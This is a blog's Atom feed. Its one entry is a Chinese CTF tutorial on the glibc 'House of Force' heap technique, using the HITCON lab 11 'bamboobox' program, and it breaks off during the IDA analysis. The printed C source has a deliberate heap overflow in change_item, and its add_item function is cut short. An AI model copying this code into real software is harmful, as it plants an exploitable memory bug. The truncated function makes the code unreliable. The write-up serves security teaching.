<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ky不是枕木</title>
  
  <subtitle>分享学习经验</subtitle>
  <link href="https://kylinxin.github.io/atom.xml" rel="self"/>
  
  <link href="https://kylinxin.github.io/"/>
  <updated>2023-09-12T09:49:28.757Z</updated>
  <id>https://kylinxin.github.io/</id>
  
  <author>
    <name>Kylinxin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>House of Force</title>
    <link href="https://kylinxin.github.io/2023/09/12/House%20of%20Force/"/>
    <id>https://kylinxin.github.io/2023/09/12/House%20of%20Force/</id>
    <published>2023-09-12T15:14:29.000Z</published>
    <updated>2023-09-12T09:49:28.757Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN入门（3-12-1）-House-Of-Force（控制top-chunk）（基础）"><a href="#PWN入门（3-12-1）-House-Of-Force（控制top-chunk）（基础）" class="headerlink" title="PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）"></a>PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）</h1><p>参考资料：<br>CTF-wiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a><br>附件下载：<br>链接: <a href="https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA">https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA</a>  密码: np57<br>–来自百度网盘超级会员V3的分享<br>    House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。</p><p>题目来源：HITCON training lab 11<br>附件：<br>链接: <a href="https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ">https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ</a>  密码: abtk<br>–来自百度网盘超级会员V3的分享</p><h2 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h2><p>老规矩，checksec一下文件先</p><p class='item-img' data-src='https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png'><img src="https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png" alt="Snipaste_2023-09-12_17-08-13.png"></p><p>计算一下 main_arena 距离 libc 的距离</p><p class='item-img' data-src='https://s2.loli.net/2023/09/12/aDliI4HtRFV1Sq7.png'><img src="https://s2.loli.net/2023/09/12/aDliI4HtRFV1Sq7.png" alt="Snipaste_2023-09-12_17-05-27.png"></p><h2 id="程序的源代码-c"><a href="#程序的源代码-c" class="headerlink" title="程序的源代码(c)"></a>程序的源代码(c)</h2><details class="code-render">   <summary>Your code summary</summary><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> {</span><br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-type">char</span> *name;<br>};<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> <span class="hljs-title">itemlist</span>[100] =</span> {<span class="hljs-number">0</span>};<br><br><span class="hljs-type">int</span> num;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hello_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is a box with magic"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"what do you want to do in the box"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">goodbye_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"See you next time"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Thanks you"</span>);<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> {</span><br>  <span class="hljs-type">void</span> (*hello_message)();<br>  <span class="hljs-type">void</span> (*goodbye_message)();<br>};<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>      <span class="hljs-keyword">if</span> (itemlist[i].name) {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, i, itemlist[i].name);<br>      }<br>    }<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">""</span>);<br>  }<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> sizebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">100</span>) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    read(<span class="hljs-number">0</span>, sizebuf, <span class="hljs-number">8</span>);<br>    length = atoi(sizebuf);<br>    <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">char</span> lengthbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> index;<br>  <span class="hljs-type">int</span> readsize;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>      read(<span class="hljs-number">0</span>, lengthbuf, <span class="hljs-number">8</span>);<br>      length = atoi(lengthbuf);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>);<br>      readsize = read(<span class="hljs-number">0</span>, itemlist[index].name, length);<br>      *(itemlist[index].name + readsize) = <span class="hljs-string">'\x00'</span>;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><span class="hljs-type">void</span> <span class="hljs-title function_">remove_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> index;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">free</span>(itemlist[index].name);<br>      itemlist[index].name = <span class="hljs-number">0</span>;<br>      itemlist[index].size = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      num--;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  fd = open(<span class="hljs-string">"./flag"</span>, O_RDONLY);<br>  read(fd, buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>  close(fd);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buffer);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> choicebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> choice;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> *<span class="hljs-title">bamboo</span>;</span><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  bamboo = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> box));<br>  bamboo-&gt;hello_message = hello_message;<br>  bamboo-&gt;goodbye_message = goodbye_message;<br>  bamboo-&gt;hello_message();<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, choicebuf, <span class="hljs-number">8</span>);<br>    choice = atoi(choicebuf);<br>    <span class="hljs-keyword">switch</span> (choice) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      show_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      add_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      change_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      remove_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>      bamboo-&gt;goodbye_message();<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number"><code class="language-hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> {</span><br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-type">char</span> *name;<br>};<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> <span class="hljs-title">itemlist</span>[100] =</span> {<span class="hljs-number">0</span>};<br><br><span class="hljs-type">int</span> num;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hello_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is a box with magic"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"what do you want to do in the box"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">goodbye_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"See you next time"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Thanks you"</span>);<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> {</span><br>  <span class="hljs-type">void</span> (*hello_message)();<br>  <span class="hljs-type">void</span> (*goodbye_message)();<br>};<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>      <span class="hljs-keyword">if</span> (itemlist[i].name) {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, i, itemlist[i].name);<br>      }<br>    }<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">""</span>);<br>  }<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> sizebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">100</span>) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    read(<span class="hljs-number">0</span>, sizebuf, <span class="hljs-number">8</span>);<br>    length = atoi(sizebuf);<br>    <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">char</span> lengthbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> index;<br>  <span class="hljs-type">int</span> readsize;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>      read(<span class="hljs-number">0</span>, lengthbuf, <span class="hljs-number">8</span>);<br>      length = atoi(lengthbuf);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>);<br>      readsize = read(<span class="hljs-number">0</span>, itemlist[index].name, length);<br>      *(itemlist[index].name + readsize) = <span class="hljs-string">'\x00'</span>;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><span class="hljs-type">void</span> <span class="hljs-title function_">remove_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> index;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">free</span>(itemlist[index].name);<br>      itemlist[index].name = <span class="hljs-number">0</span>;<br>      itemlist[index].size = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      num--;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  fd = open(<span class="hljs-string">"./flag"</span>, O_RDONLY);<br>  read(fd, buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>  close(fd);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buffer);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> choicebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> choice;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> *<span class="hljs-title">bamboo</span>;</span><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  bamboo = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> box));<br>  bamboo-&gt;hello_message = hello_message;<br>  bamboo-&gt;goodbye_message = goodbye_message;<br>  bamboo-&gt;hello_message();<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, choicebuf, <span class="hljs-number">8</span>);<br>    choice = atoi(choicebuf);<br>    <span class="hljs-keyword">switch</span> (choice) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      show_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      add_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      change_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      remove_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>      bamboo-&gt;goodbye_message();<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure></details><h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a><strong>IDA静态分析</strong></h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">void</span> (**v4)(<span class="hljs-type">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  v4 = (<span class="hljs-type">void</span> (**)(<span class="hljs-type">void</span>))<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *v4 = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))hello_message;<br>  v4[<span class="hljs-number">1</span>] = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))goodbye_message;<br>  (*v4)();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    <span class="hljs-keyword">switch</span> ( atoi(buf) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        show_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        add_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        change_item(buf, buf);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        remove_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        v4[<span 